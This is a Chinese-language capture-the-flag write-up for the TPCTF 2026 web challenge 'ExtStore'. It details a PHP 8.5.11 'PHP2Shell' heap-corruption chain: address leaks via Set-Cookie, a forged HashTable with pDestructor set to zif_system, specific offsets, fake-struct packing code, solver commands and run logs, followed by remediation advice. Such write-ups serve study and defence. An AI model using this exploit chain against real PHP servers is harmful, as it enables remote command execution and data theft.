# ExtStore 渲染管线 — 让请求管线替你执行

```
> TPCTF 2026 · web · 挑战 ID `AUTHORED-FA956063` · 状态 solved
```

## 一句话

ExtStore 是一个主题商店的运维控制台：它只做两件事，把一个主题包排进渲染队列， 以及报告自己的健康状态。

## 附件

| 文件 | 大小 | sha256 |
| --- | --- | --- |
| `AUTHORED-FA956063.zip` | 3.0 KB | `94600003d180…` |
| `zip/docker-compose.yml` | 1.2 KB | `b5a56efb251c…` |
| `zip/services/target/alias.conf` | 87 B | `7b456acbee54…` |
| `zip/services/target/prefork.conf` | 172 B | `73a393f4470f…` |
| `zip/services/target/php.ini` | 279 B | `c0443928b464…` |
| `zip/services/target/app/console.php` | 754 B | `c2e4476e91b9…` |
| `zip/services/target/app/t.php` | 17 B | `db28e0750bdb…` |
| `zip/services/target/app/healthz.php` | 17 B | `db28e0750bdb…` |
| `zip/services/target/app/index.php` | 754 B | `c2e4476e91b9…` |
| `zip/services/target/app/assets/console.js` | 178 B | `76e11f0e961a…` |

## 分析与利用

FLAG：«FLAG»

分值：动态计分

### 1. 题目结构

docker-compose.yml 里有两个服务：

| 服务 | 作用 |
| --- | --- |
| flag-rotator | 把 ANSWER_FLAG 写到卷 answers 的 /out/f |
| target | php:8.5.11-apache，把卷 answers 挂到 /f，Web 根目录为只读的 app/ |

因此 flag 的完整路径是 /f/f，不是 /f：

• docker-compose.yml:9：rotator 执行 printf %s "$ANSWER_FLAG" > /out/f
• docker-compose.yml:34：answers:/f 把卷挂在目录 /f
• 所以容器内文件为 /f/f

Web 应用只有两个动作：

• index.php / console.php：stage=home 输出页面，stage=upload 只统计 $_FILES 数量；
• healthz.php、t.php：输出 ok。

源码中没有 include、file_get_contents、eval、system 等危险调用。也就是说，不能从应用层直接读文件或执行命令，必须打 PHP/Apache 运行时。

关键配置：

; services/target/php.ini

```
display_errors=On
display_startup_errors=On
error_reporting=E_ALL
memory_limit=16M
post_max_size=32M
upload_max_filesize=32M
session.save_path=/tmp
session.use_strict_mode=0
session.use_cookies=1
session.upload_progress.enabled=On
session.upload_progress.cleanup=On
expose_php=0
```

# services/target/prefork.conf

KeepAlive Off

StartServers 1

MinSpareServers 1

MaxSpareServers 1

MaxRequestWorkers 1

ServerLimit 1

MaxConnectionsPerChild 0

# services/target/alias.conf

Alias /t/ /tmp/

<Directory /tmp>

Require all granted

Options -Indexes

</Directory>

这组配置就是公开 PHP2Shell 利用链的“标准靶场”：

• session.upload_progress.enabled=On：multipart 上传会创建 session 进度数据；
• memory_limit=16M + 32M 的 POST 上限：可以用一个超大字段精确触发 OOM；
• 单 worker + MaxConnectionsPerChild=0：堆状态在请求间保持稳定，便于 groom；
• session.save_path=/tmp 与 Alias /t/ /tmp/：命令把结果写进 /tmp 后可以直接通过 HTTP 读回。

### 2. 漏洞：PHP2Shell（PHP 8.5.11）

php:8.5.11-apache 低于修复版 8.5.12。公开资料把这条针对 PHP 8.x + mod_php + prefork 的链称为 PHP2Shell（CVE-2026-109618 / CVE-2026-109619）。

| CVE | 问题 |
| --- | --- |
| CVE-2026-109618 | OOM 处理路径中的内存破坏 |
| CVE-2026-109619 | 请求之间复用陈旧的全局状态 |

利用不需要应用层漏洞，核心是：

1. 用 multipart/form-data + session.upload_progress 让 PHP 在解析上传时创建大量临时 Zend 结构；
2. 用 12 MiB 的大字段把请求推到 memory_limit=16M 的 OOM 边界，使清理路径留下可复用的堆布局；
3. 后续请求复用这些堆块，构造长度异常的 zend_string / HashTable，把堆指针或 libphp 地址泄漏进 Set-Cookie；
4. 最后伪造 HashTable，把 pDestructor 改成 zif_system，并伪造 execute_data，让 PHP 在销毁 session 变量时调用 system(cmd)。

这条链的“命令长度上限”来自承载 fake HashTable 的 167 字节 zend_string：

# _dl/php2shell/exploit.py:50

```
MAX_CMD = 14                # 167-byte carrier - 0x98 header - NUL
```

所以命令必须不超过 14 字节。本题选择：

cp /f/f /tmp/x

刚好 14 字节。执行后 /tmp/x 就是 flag 的副本，再通过 /t/x 读取。

### 3. 利用链细节

**3.1 总体流程**

rotate worker

│

▼

stage 1  A/B 请求 ──► 从 Set-Cookie 泄漏 Zend MM chunk base

│

▼

rotate worker

│

▼

stage 2  A/B 请求 ──► 从 Set-Cookie 泄漏 zval_ptr_dtor，算出 libphp base

│

▼

stage 3  A 请求（堆布局）

│

▼

stage 3  B 请求（899 个 fake reference + 15 份 fake HashTable）

│

▼

```
pDestructor = zif_system
```

│

▼

system("cp /f/f /tmp/x")

│

▼

GET /t/x  →  FLAG

**3.2 常量与 profile**

本题使用的偏移：

| 名称 | 值 | 用途 |
| --- | --- | --- |
| ZIF | 0x5996e0 | zif_system 相对 libphp 的偏移 |
| DTOR | 0x7b47a0 | zval_ptr_dtor 相对 libphp 的偏移 |
| HT_DEFAULT | 0xB3018 | fake HashTable 所在 chunk 相对偏移 |

堆布局参数来自 8.5.11-bookworm-amd64 profile：

```
stage1_n      = 841
stage2_t      = 406
stage2_v      = 16
stage3_pads   = ((31, 31),) * 6
stage3_carrier = true
```

实际求解器 _dl/solve.py 还会做两件事：

• 用 _dl/widen.py 把指针过滤范围放宽到 0x0000600000000000 – 0x0000800000000000；
• 使用 12 MiB 的 big 字段（--huge 12）触发 16M 限制下的 OOM。

**3.3 stage 1：泄漏 chunk base**

A 请求：

• 1001 个 pNNNN，每个 1 字节；
• PHPSESSID=\x00；
• PHP_SESSION_UPLOAD_PROGRESS=pwn；
• 64 字节文件；
• 12 MiB 的 big 字段。

B 请求：

• PHPSESSID=attacksessionid0001；
• 841 个 48 字节字段，名字为 1000..1840；
• 一个 79 字节的 forge 字段，名字 1999：
• 偏移 0x10 写入 0x1000（伪造 zend_string.len）；
• 偏移 0x18 写入字节 L。

B 的响应里，Set-Cookie: PHPSESSID=... 会带出被异常长度字符串读到的堆内容。chunk_base_from_cookie() 把解码后的 cookie 中所有 8 字节小端指针按 2 MiB 对齐分桶，取出现次数最多且至少 8 次的桶：

# _dl/widen.py

LO, HI = 0x0000600000000000, 0x0000800000000000

```python
def chunk_base_from_cookie(raw):
if len(raw) < 1000:
return 0
c = Counter()
for i in range(len(raw) - 8):
v = int.from_bytes(raw[i:i + 8], "little")
if LO <= v < HI:
```

c[v & ~0x1FFFFF] += 1

```
if not c:
return 0
```

base, count = c.most_common(1)[0]

```
return base if count >= 8 else 0
```

远程结果为：

```
chunk=0x786cc6200000
```

**3.4 stage 2：泄漏 libphp base**

A 请求：

• 1001 个 39 字节的 fNNNN 字段；
• 同样带 PHPSESSID=\x00、progress、64 字节文件、12 MiB big 字段。

B 请求：

• 983 组 aNNNN[j]；
• 在 index 406 处放 16 个 16 字节值；
• 其余数组各 1 个元素。

这一步让 Set-Cookie 的数据从 session 结构偏移 0x18 开始，直接带出 pDestructor（即 zval_ptr_dtor）。解析逻辑读取 raw[8:16]：

```python
def libphp_base_from_cookie(raw, dtor_offset):
if len(raw) < 16:
return 0
p = int.from_bytes(raw[8:16], "little")
if not (LO <= p < HI):
return 0
if p & 0xFFF != dtor_offset & 0xFFF:
return 0
base = p - dtor_offset
return base if base & 0xFFF == 0 else 0
```

远程结果为：

```
libphp=0x786cc7e00000
```

于是：

```
htdata = chunk + 0xB3018 = 0x786cc62b3018
zif    = libphp + 0x5996e0
```

**3.5 stage 3：伪造 HashTable 与 pDestructor**

A 请求负责把 session 相关的堆布局固定下来：

• PHPSESSID 为 19 个 a；
• PHP_SESSION_UPLOAD_PROGRESS 为 3 个 p；
• 6 组 (name_len=31, value_len=31) 的 pad；
• 64 字节文件；
• 12 MiB big 字段；
• 额外请求头 Cookie: PHPSESSID= + 32 个 a。

B 请求是最终一击：

1. 899 个 39 字节的 carrier，名字 cNNNN；
2. 每个 carrier 在偏移 8 处写入 24 字节 fake reference：

```
ref = struct.pack("<IIQQ", 1, 0x1A, htdata, 0x307)
```

3. 15 份 167 字节的 fake HashTable，名字 hNNNN；
4. 最后放 PHP_SESSION_UPLOAD_PROGRESS=pwn。

fake HashTable 的关键字段：

# _dl/php2shell/exploit.py:_fake_payload()

```
struct.pack_into("<II", ht, 0x00, 1, 7)                 # gc: rc=1, IS_ARRAY
struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)     # flags, nTableMask
struct.pack_into("<Q", ht, 0x10, htdata + 0x20)         # arData
struct.pack_into("<II", ht, 0x18, 1, 1)                 # nNumUsed/OfElements
struct.pack_into("<II", ht, 0x20, 8, 0)                 # nTableSize/pointer
struct.pack_into("<Q", ht, 0x28, 0)                     # nNextFreeElement
struct.pack_into("<Q", ht, 0x30, zif)                   # pDestructor = zif_system
```

同时在 htdata+0x20 伪造 execute_data：

• num_args = 1；
• arg1 value 指向 htdata+0x80；
• arg1 type = 6（IS_STRING）。

在 htdata+0x80 伪造 zend_string：

• 长度等于命令长度；
• 命令字节紧跟在 0x98 之后，并以 NUL 结尾。

请求结束时，PHP 销毁 session 变量，走到 fake HashTable 的 pDestructor，以伪造的 execute_data 调用：

zif_system("cp /f/f /tmp/x")

命令以 www-data 身份执行。/f/f 对 worker 可读，副本写入 /tmp/x。

### 4. 复现步骤

**4.1 本地复现**

本地用一份只保留 target 的 compose 覆盖文件，把测试 flag 挂到 /f：

```
cd /path/to/TPCTF决赛
```

mkdir -p extstore_src/testflag

printf '«FLAG»' > extstore_src/testflag/f

docker compose -f extstore_src/docker-compose.local.yml up -d

启动后访问：

```bash
curl -i http://localhost:18080/console.php
```

Docker Desktop 下用 localhost:18080；127.0.0.1:18080 可能因端口转发表现异常而挂起。

执行利用：

```bash
python -u _dl/solve.py 'http://localhost:18080/console.php' --cmd 'cp /f/f /tmp/x' --huge 12 --retries 2
```

日志：

```
chunk=0x72a61cc00000
libphp=0x72a619600000
htdata=0x72a61ccb3018
```

done True

读取：

```bash
curl -i http://localhost:18080/t/x
```

返回测试 flag «FLAG»。验证后停止容器：

docker compose -f extstore_src/docker-compose.local.yml down

**4.2 远程复现**

该实例为临时实例，过期后 VPN 与服务 IP 会失效；重新开题时需用平台 API 获取新的 service host / IP，下面的地址仅对应本次复现。

本题实例通过 CTFy 平台 API 获取：

instance_id : fa614d0c-6d41-4968-a628-cfa54f07b2ea

challenge_id: AUTHORED-FA956063

service     : {{INSTANCE_HOST}}:80

VPN         : {{WG_ENDPOINT}}/udp

本地 VPN IP : 172.16.121.254/32

服务 IP     : 172.16.121.2

确认可达：

```bash
curl -i http://172.16.121.2/
```

执行：

```bash
python -u _dl/solve.py 'http://172.16.121.2/console.php' --cmd 'cp /f/f /tmp/x' --huge 12 --retries 3
```

extstore_remote_solve.log：

=== attempt 1 ===

```
chunk=0x786cc6200000 libphp=0x786cc7e00000
htdata=0x786cc62b3018
```

done True

读取：

```bash
curl -i http://172.16.121.2/t/x
```

响应：

HTTP/1.1 200 OK

Date: Sun, 22 Nov 2026 07:12:08 GMT

Server: Apache/2.4.69 (Debian)

Last-Modified: Sun, 22 Nov 2026 07:11:53 GMT

ETag: "26-660d83121e216"

Accept-Ranges: bytes

Content-Length: 38

Connection: close

正文：

«FLAG»

### 5. 结果

«FLAG»

复现证据：

| 文件 | 内容 / SHA-256 |
| --- | --- |
| extstore_flag.txt | «FLAG»；SHA-256 1b8d37effe35b5453c0d470f96f11f511b5f175ab6ea4d81aa705896829316e4 |
| extstore_remote_solve.log | 4 行，含 chunk/libphp/htdata；SHA-256 20340d45e3039d0ca84f7caa24904aba0e798a5ef6492debaec49eb594b290f2 |
| extstore_flag_headers.txt | /t/x 的 HTTP 响应头 |
| extstore_src/AUTHORED-FA956063.zip | 原始附件；SHA-256 94600003d1800e72a96884157a7be0572d7e6d28934d2c1af34a78da4eb9b268 |

### 6. 修复建议

1. 升级到 PHP 8.5.12 或更高版本；
2. 不需要上传进度时关闭 session.upload_progress.enabled；
3. 不要把 /tmp 通过 Alias /t/ 暴露为静态目录；
4. session 文件不要与 Web 可读目录混放；
5. 给 PHP 进程使用最小权限，flag 文件不要放在 worker 可读的路径。

### 7. 参考

• PHP 8.5.12 changelog / 安全修复
• php2shell 公开利用资料：extstore_src/research/php2shell/
• 本工作区求解器：_dl/solve.py、_dl/widen.py、_dl/php2shell/exploit.py

## 结果

- flag sha256：`1b8d37effe35b5453c0d470f96f11f511b5f175ab6ea4d81aa705896829316e4`, `730dcea6a603b4b1fa1dff0fe2b45fbab80a3b5de3bb638018bab2a1d225283d`
- 明文 flag 不入库；提交记录见 `.ctf-submissions.jsonl` 或原始 WP。

## 脚本

- （未归档脚本，见原始工作目录）

## 待核实

- 本条目由 WP 第 12 节《ExtStore 渲染管线 — 让请求管线替你执行》与平台附件自动合成，建议人工复核 summary 与 fingerprints。
